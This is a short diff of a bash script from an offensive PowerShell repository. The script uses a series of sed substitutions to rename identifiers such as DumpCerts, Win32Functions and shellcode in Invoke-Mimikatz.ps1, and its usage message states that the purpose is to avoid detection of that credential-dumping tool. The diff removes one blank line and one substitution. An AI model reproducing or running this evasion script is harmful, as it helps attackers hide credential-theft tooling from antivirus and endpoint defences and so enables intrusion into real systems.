@@ -6,7 +6,6 @@
 # License: BSD 3-Clause
 # https://github.com/1RicardoTavares/Offensive-PowerShell
 #
- 
 
 if [[ $# -le 1 ]] ; then
     echo 'To avoid Invoke-Mimikatz.ps1 detection run:'
@@ -26,7 +25,6 @@ sed -i -e "s/DumpCerts/$(randstr)/g" $2
 sed -i -e "s/CustomCommand/$(randstr)/g" $2
 sed -i -e "s/TypeBuilder/$(randstr)/g" $2
 sed -i -e "s/Win32Types/$(randstr)/g" $2
-sed -i -e "s/Win32Constants/$(randstr)/g" $2
 sed -i -e "s/Win32Functions/$(randstr)/g" $2
 sed -i -e "s/shellcode/$(randstr)/g" $2
 sed -i -e "s/PEBytes64/$(randstr)/g" $2
